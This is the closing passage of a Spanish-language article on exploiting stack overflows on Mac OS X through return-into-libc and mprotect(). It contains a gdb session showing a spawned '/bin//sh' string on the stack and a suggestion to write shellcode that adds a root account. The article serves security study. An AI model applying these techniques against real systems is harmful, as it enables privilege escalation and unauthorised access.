+a execve( )), el programa todavia seguire ejecutando una nueva shell.
+
+En cambio, si utilizamos esta en "boom.c", el programa vulnerable respondera
+de la siguiente manera:
+
+ooooo
+
+(gdb) run < bam
+Starting program: /Users/blackngel/vuln2 < bam
+Reading symbols for shared libraries . done
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x8fe01010 in __dyld__dyld_start ()
+(gdb) c
+Continuing.
+Reading symbols for shared libraries .. done
+
+Program exited normally.
+(gdb) 
+
+ooooo
+
+En realidad, recibir este mensaje es muy buena seal, buscando y revisando
+algunos otros articulos sobre explotacion en MAC, parece que todo el mundo
+utilizando GDB termina por recibir este aviso antes de que la shell sea
+lanzada, y es que es precisamente un avisto de que un nuevo proceso esta
+siendo ejecutado.
+
+Lo que es mas, si examinamos la pila justo en ese mismo momento, podremos
+encontrar nuestra cadena:
+
+(gdb) x/32s $esp
+...........
+0xbfffffd7:      ""
+0xbfffffd8:      "/bin//sh"
+
+Aunque parece que nosotros no tenemos tanta suerte! Desde fuera de GDB,
+"./vuln2" seguira volcando un "Bus error".
+
+Una cosa esta clara, y es que es posible ejecutar codigo en la pila tras
+haber invocado a mprotect( ). Tal vez si consigues encontrar o programar
+tu mismo una shellcode que agregue una cuenta con permisos de "root" al
+sistema en vez de llamar a execve( ), tal vez repito, funcione correctamente.
+
+Espero que vuestras mentes inquietas no dejen el misterio sin resolver ;)
+
+
+
+---[ 5 - Conclusion
+
+Como bien se ha demostrado a lo largo de este articulo, Mac OS X no es
+precisamente uno de los Sistemas Operativos mas protegidos en esta era
+en la que las empresas comienzan por fin a interesarse en la problematica
+de la seguridad.
+
+Mientras no se implemente una capa de aleatorizacion de direcciones de
+memoria lo suficientemente robusta, innumerables fallos relativos a
+desbordamientos de buffer podran seguir siendo explotados en base a tecnicas
+Return Into to Libc, y nada podra evitarlo.
+
+Feliz hacking!
+blackngel
+
+
+
+---[ 6 - Referencias
+
+ [1] b-r00t's Smashing the Mac for Fun & Profit.
+     http://www.milw0rm.com/papers/44  
+
+ [2] Non eXecutable Stack Lovin on OSX86.
+     http://digitalmunition.com/NonExecutableLovin.txt
+
+ [3] Feline Menace. The Mach System.
+     http://felinemenace.org/~nemo/mach/Mach.txt
+
+ [4] Abusing Mach on Mac OS X.
+     http://uninformed.org/?v=4&a=3&t=pdf
+
+
+*EOF*
